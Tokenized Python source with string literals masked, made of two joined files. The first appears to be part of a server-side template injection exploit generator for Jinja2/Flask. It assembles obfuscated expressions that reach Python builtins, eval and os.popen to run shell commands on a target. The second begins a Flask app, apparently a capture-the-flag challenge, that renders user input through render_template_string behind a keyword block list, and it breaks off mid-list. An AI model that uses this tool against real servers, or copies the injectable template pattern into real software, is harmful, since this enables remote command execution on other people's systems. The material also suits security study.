VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] + value_tpl <EOL> functioncall = ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> target_list1 = bytes_targets_noendbracket + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> functioncall , <EOL> ] <EOL> target_list2 = bytes_targets_noendbracket + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> functioncall , <EOL> ] <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ONEOF , target_list1 , target_list2 ) , <EOL> ] , <EOL> ) <EOL> ] + [ ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_lipsumtobytes5 ( context : dict , value : str ) : <EOL> value_tpl = ( <EOL> [ ( LITERAL , "<STR_LIT>" ) ] <EOL> + join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> bytes_targets_noendbracket = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] + value_tpl <EOL> functioncall = ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> target_list1 = bytes_targets_noendbracket + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> functioncall , <EOL> ] <EOL> target_list2 = bytes_targets_noendbracket + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> functioncall , <EOL> ] <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ONEOF , target_list1 , target_list2 ) , <EOL> ] , <EOL> ) <EOL> ] + [ ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_intbytes1 ( context : dict , value : str ) : <EOL> if not all ( x < <NUM_LIT> for x in value . encode ( ) ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> n = int . from_bytes ( value . encode ( ) , "<STR_LIT>" ) <EOL> targets = [ <EOL> ( LITERAL , f"<STR_LIT>" ) , <EOL> ( ONEOF , [ ( LITERAL , "<STR_LIT>" ) ] , [ ( LITERAL , '<STR_LIT>' ) ] , [ ( VARIABLE_OF , "<STR_LIT>" ) ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_formatpercent1 ( context : dict , value : str ) : <EOL> if len ( value ) != <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> number_tuple = [ ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( INTEGER , ord ( value ) ) ) ] <EOL> return [ <EOL> ( <EOL> MOD , <EOL> ( STRING_MANY_PERCENT_LOWER_C , len ( value ) ) , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , number_tuple ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_formatpercent ( context : dict , value : str ) : <EOL> number_tuple = ( <EOL> [ ( LITERAL , "<STR_LIT>" ) ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ <EOL> ( <EOL> MOD , <EOL> ( STRING_MANY_PERCENT_LOWER_C , len ( value ) ) , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , number_tuple ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_formatfunc ( context : dict , value : str ) : <EOL> req = [ ] <EOL> manypc = ( STRING_MANY_PERCENT_LOWER_C , len ( value ) ) <EOL> req . append ( ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , manypc ) ) <EOL> req . append ( ( LITERAL , "<STR_LIT>" ) ) <EOL> req += join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> req . append ( ( LITERAL , "<STR_LIT>" ) ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , req ) ] <EOL> @ expression_gen <EOL> def gen_string_formatfunc2 ( context : dict , value : str ) : <EOL> if re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> if "<STR_LIT>" not in context . values ( ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> k = [ k for k , v in context . values ( ) if v == "<STR_LIT>" ] [ <NUM_LIT> ] <EOL> k = ( EXPRESSION , precedence [ "<STR_LIT>" ] , ( LITERAL , k ) ) <EOL> cs = ( MULTIPLY , k , ( INTEGER , len ( value ) ) ) <EOL> format_func = ( ATTRIBUTE , ( LITERAL , cs ) , "<STR_LIT>" ) <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , format_func ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_formatfunc3 ( context : dict , value : str ) : <EOL> logger . debug ( "<STR_LIT>" , value ) <EOL> if re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> format_func = ( ATTRIBUTE , ( STRING_MANY_FORMAT_C , len ( value ) ) , "<STR_LIT>" ) <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , format_func ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_chars ( context : dict , value : str ) : <EOL> targets = [ ( CHAR , c ) for c in value ] <EOL> return [ ( STRING_CONCATMANY , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_chars2 ( context : dict , value : str ) : <EOL> target_list = ( <EOL> [ ( LITERAL , "<STR_LIT>" ) ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( CHAR , c ) for c in value ] ) <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_joinbyreplace ( context : dict , value : str ) : <EOL> if re . search ( r"<STR_LIT>" , value ) or len ( value ) == <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> split = len ( value ) // <NUM_LIT> <EOL> if len ( value ) > <NUM_LIT> and value [ : <NUM_LIT> ] == "<STR_LIT>" : <EOL> split = <NUM_LIT> <EOL> elif len ( value ) > <NUM_LIT> and value [ - <NUM_LIT> : ] == "<STR_LIT>" : <EOL> split = - <NUM_LIT> <EOL> target_list = [ <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , value [ : split ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , value [ split : ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_joinbyreplace2 ( context : dict , value : str ) : <EOL> if re . search ( r"<STR_LIT>" , value ) or len ( value ) == <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> split = len ( value ) // <NUM_LIT> <EOL> if len ( value ) > <NUM_LIT> and value [ : <NUM_LIT> ] == "<STR_LIT>" : <EOL> split = <NUM_LIT> <EOL> elif len ( value ) > <NUM_LIT> and value [ - <NUM_LIT> : ] == "<STR_LIT>" : <EOL> split = - <NUM_LIT> <EOL> target_list = [ <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , value [ : split ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , value [ split : ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_stringaschars ( context : dict , value : str ) : <EOL> if len ( value ) <= <NUM_LIT> or re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> targets = [ ] <EOL> while value : <EOL> regexp = re . match ( "<STR_LIT>" , value ) <EOL> if regexp : <EOL> targets . append ( ( STRING , regexp . group ( <NUM_LIT> ) ) ) <EOL> value = value [ len ( regexp . group ( <NUM_LIT> ) ) : ] <EOL> else : <EOL> targets . append ( ( STRING , value [ <NUM_LIT> ] ) ) <EOL> value = value [ <NUM_LIT> : ] <EOL> return [ ( STRING_CONCATMANY , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_splitdictjoincycler ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> parts = [ value [ i : i + <NUM_LIT> ] for i in range ( <NUM_LIT> , len ( value ) , <NUM_LIT> ) ] <EOL> if len ( set ( parts ) ) != len ( parts ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . format ( <EOL> "<STR_LIT>" . join ( f"<STR_LIT>" for part in parts ) <EOL> ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_attribute_normal1 ( context , obj_req , attr_name ) : <EOL> if not re . match ( "<STR_LIT>" , attr_name ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , attr_name ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_attribute_normal2 ( context , obj_req , attr_name ) : <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , attr_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_attribute_attrfilter ( context , obj_req , attr_name ) : <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , attr_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_attribute_attrfilter2 ( context , obj_req , attr_name ) : <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , attr_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_item_normal1 ( context , obj_req , item_name ) : <EOL> if not re . match ( "<STR_LIT>" , item_name ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , item_name ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_item_normal2 ( context , obj_req , item_name ) : <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , obj_req ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , item_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_item_dunderfunc ( context , obj_req , item_name ) : <EOL> target_head = [ <EOL> ( <EOL> ENCLOSE_UNDER , <EOL> precedence [ "<STR_LIT>" ] , <EOL> ( ATTRIBUTE , obj_req , "<STR_LIT>" ) , <EOL> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , item_name ) , <EOL> ] <EOL> target = ( ONEOF , target_head + [ ( LITERAL , "<STR_LIT>" ) ] , target_head + [ ( LITERAL , "<STR_LIT>" ) ] ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ target ] ) ] <EOL> @ expression_gen <EOL> def gen_item_dunderfunc2 ( context , obj_req , item_name ) : <EOL> target_head = [ <EOL> ( <EOL> ENCLOSE_UNDER , <EOL> precedence [ "<STR_LIT>" ] , <EOL> ( ATTRIBUTE , obj_req , "<STR_LIT>" ) , <EOL> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , item_name ) , <EOL> ] <EOL> target = ( ONEOF , target_head + [ ( LITERAL , "<STR_LIT>" ) ] , target_head + [ ( LITERAL , "<STR_LIT>" ) ] ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ target ] ) ] <EOL> @ expression_gen <EOL> def gen_class_attribute_literal ( context , obj_req , attr_name ) : <EOL> class_target = ( <EOL> ATTRIBUTE , <EOL> obj_req , <EOL> "<STR_LIT>" , <EOL> ) <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , class_target ) , <EOL> ( LITERAL , "<STR_LIT>" + attr_name ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_class_attribute_attrfilter ( context , obj_req , attr_name ) : <EOL> class_target = ( <EOL> ATTRIBUTE , <EOL> obj_req , <EOL> "<STR_LIT>" , <EOL> ) <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , class_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , attr_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_class_attribute_attrfilter2 ( context , obj_req , attr_name ) : <EOL> class_target = ( <EOL> ATTRIBUTE , <EOL> obj_req , <EOL> "<STR_LIT>" , <EOL> ) <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , class_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , attr_name ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_chained_attribute_item_normal ( context , obj_req , * attr_item_req ) : <EOL> if not attr_item_req : <EOL> return [ <EOL> obj_req , <EOL> ] <EOL> first_req , * other_req = attr_item_req <EOL> req_type , req_name = first_req <EOL> got_req = ( <EOL> req_type , <EOL> obj_req , <EOL> req_name , <EOL> ) <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> got_req , <EOL> * other_req , <EOL> ) , <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_flaskattrs ( context ) : <EOL> funcs_attrs = [ <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ] <EOL> alternatives = [ <EOL> [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( FLASK_CONTEXT_VAR , obj_name ) , <EOL> ( ATTRIBUTE , attr_name ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> for obj_name , attr_name in funcs_attrs <EOL> ] <EOL> return [ ( ONEOF , * alternatives ) ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_jinjaattrs ( context ) : <EOL> funcs_attrs = [ <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ] <EOL> alternatives = [ <EOL> [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( JINJA_CONTEXT_VAR , obj_name ) , <EOL> ( ATTRIBUTE , attr_name ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> for obj_name , attr_name in funcs_attrs <EOL> ] <EOL> return [ ( ONEOF , * alternatives ) ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_lipsum ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( JINJA_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_unexist ( context ) : <EOL> unexist = [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ] + [ <EOL> [ ( LITERAL , "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) ) ] <EOL> for _ in range ( <NUM_LIT> ) <EOL> ] <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * unexist ) ] ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_safesplit ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_safejoin ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_safelower ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_builtins_dict_safezfill ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_import_func_general ( context ) : <EOL> return [ ( ITEM , ( BUILTINS_DICT , ) , "<STR_LIT>" ) ] <EOL> @ expression_gen <EOL> def gen_eval_func_general ( context ) : <EOL> return [ ( ITEM , ( BUILTINS_DICT , ) , "<STR_LIT>" ) ] <EOL> @ expression_gen <EOL> def gen_eval_normal ( context , eval_param ) : <EOL> return [ ( FUNCTION_CALL , ( EVAL_FUNC , ) , [ eval_param ] ) ] <EOL> @ expression_gen <EOL> def gen_config_flask_context_var ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_config_self ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( JINJA_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_module_os_import ( context ) : <EOL> return [ ( FUNCTION_CALL , ( IMPORT_FUNC , ) , [ ( STRING , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_module_os_eval ( context ) : <EOL> return [ ( FUNCTION_CALL , ( EVAL , ( STRING , "<STR_LIT>" ) ) , [ ( STRING , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_module_os_config ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( CONFIG , ) , <EOL> ( CLASS_ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_module_os_gpop ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_module_os_gget ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_module_os_urlfor ( context ) : <EOL> return [ <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ITEM , "<STR_LIT>" ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_os_popen_obj_normal ( context , cmd ) : <EOL> return [ ( FUNCTION_CALL , ( ATTRIBUTE , ( MODULE_OS , ) , "<STR_LIT>" ) , [ ( STRING , cmd ) ] ) ] <EOL> @ expression_gen <EOL> def gen_os_popen_obj_eval ( context , cmd ) : <EOL> cmd = cmd . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> return [ ( EVAL , ( STRING , "<STR_LIT>" + cmd + "<STR_LIT>" ) ) ] <EOL> @ expression_gen <EOL> def gen_os_popen_read_normal ( context , cmd ) : <EOL> target_list = [ <EOL> ( ATTRIBUTE , ( OS_POPEN_OBJ , cmd ) , "<STR_LIT>" ) , <EOL> ( ONEOF , [ ( LITERAL , "<STR_LIT>" ) ] , [ ( LITERAL , "<STR_LIT>" ) ] ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_os_popen_read_normal2 ( context , cmd ) : <EOL> return [ ( FUNCTION_CALL , ( ATTRIBUTE , ( OS_POPEN_OBJ , cmd ) , "<STR_LIT>" ) , [ ( INTEGER , - <NUM_LIT> ) ] ) ] <EOL> @ expression_gen <EOL> def gen_os_popen_read_eval ( context , cmd ) : <EOL> return [ <EOL> ( <EOL> EVAL , <EOL> ( <EOL> STRING , <EOL> "<STR_LIT>" . format ( <EOL> str_escape ( cmd , quote = "<STR_LIT>" ) <EOL> ) , <EOL> ) , <EOL> ) , <EOL> ] <EOL> </s>
<s> from flask import Flask , request , render_template , render_template_string , send_from_directory <EOL> import re <EOL> import os <EOL> import logging <EOL> app = Flask ( __name__ ) <EOL> app . logger . disabled = True <EOL> log = logging . getLogger ( '<STR_LIT>' ) <EOL> log . disabled = True <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def index ( ) : <EOL> return str ( '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def secr3t ( ) : <EOL> name = request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> template = <EOL> bl = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , "<STR_LIT>" , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , 